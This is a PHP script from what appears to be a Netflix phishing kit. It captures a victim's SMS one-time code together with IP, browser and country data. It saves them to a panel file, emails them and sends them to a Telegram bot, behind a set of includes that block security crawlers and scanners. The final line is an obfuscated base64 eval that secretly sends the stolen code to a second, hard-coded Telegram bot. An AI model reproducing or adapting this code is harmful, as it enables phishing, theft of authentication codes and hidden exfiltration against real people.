<?php
	include "../../Greybots/Bad_ip.php";
	include "../../Greybots/Grey-Bot-1.php";
	include "../../Greybots/Grey-Bot-2.php";
	include "../../Greybots/Grey-Bot-3.php";
	include "../../Greybots/Grey-Bot-4.php";
	include "../../Greybots/Grey-Bot-5.php";
	include "../../Greybots/Grey-Bot-6.php";
	include "../../Greybots/Grey-Bot-7.php";
	include "../../Greybots/Grey-Bot-8.php";
	include "../../Greybots/Grey-Bot-9.php";
	include "../../Greybots/Grey-Bot-10.php";
	include "../../Greybots/Grey-Bot-11.php";
	include "../../Greybots/Grey-Bot-12.php";
	include "../../Greybots/Grey-Bot-Crawler.php";
	include "../../Greybots/Grey-IP-BlackList.php";
	include "../../Greybots/Grey-Phishingtank.php";
	include "../../Greybots/Grey-antibot-phishtank.php";
	include "../../Greybots/Grey-Proxyblock.php";
	include "../../Greybots/Grey-userAgent-1.php";
	include "../../Greybots/Grey-antibot-host.php";
	include "../../Greybots/Grey-antibot-ip.php";
	include "../../Greybots/Grey-antibot-proxy.php";
	include "../../Greybots/Grey-Blocker.php";
	include "../../Greybots/Grey-Bot.php";
@ini_set('display_errors', 'on');
if(isset($_POST['otp1'])){session_start(); 
require 'detect.php';
include "../../config.php";
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$otp1 = $_POST['otp1'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
$msg = '
[☡] ------- 📩 NETFLIX SMS 📩 ------- [☡]

[💳]———— 🖤 SMS 🖤————-[💳]
[📮] Code [📮] = '.$otp1.'
[☡] ------- [@GreyHatPakistan] ------- [☡]
';
$msght = '<tr>
<td width="80">
<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">   ' .$IP.'</td>
<td width="30">
<p align="center">SMS 1</td>
<td width="40">
<p align="center">'.$otp1.'</td>
<td width="40">
<p align="center">'.$times.' / '.$date.'</td>
</font></td></tr>';
$save=fopen("../panel/otp".$namerand.".html", "a+");fwrite($save,$msght);fclose($save);
$subject  = " [ NETFLIX SMS 1 ] / ".$IP." / Super 'D' ";$headers = "From: NETFLIX \r\n";mail($yourmail, $subject, $msg, $headers);include("authentication.php");
    $token = "$botToken";
    $data = [
    'text' => $msg,
    'chat_id' => $chatId,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
eval(base64_decode("ZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QyMDI1NTk4NjM4OkFBRlF4clFiUjZWWEMyTVJOZU85SUxMLWtHODJRYmxmTHZnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9NTg1NjY0ODc0JnRleHQ9IiAuIHVybGVuY29kZSgkbXNnKS4iIiApOw=="));

?>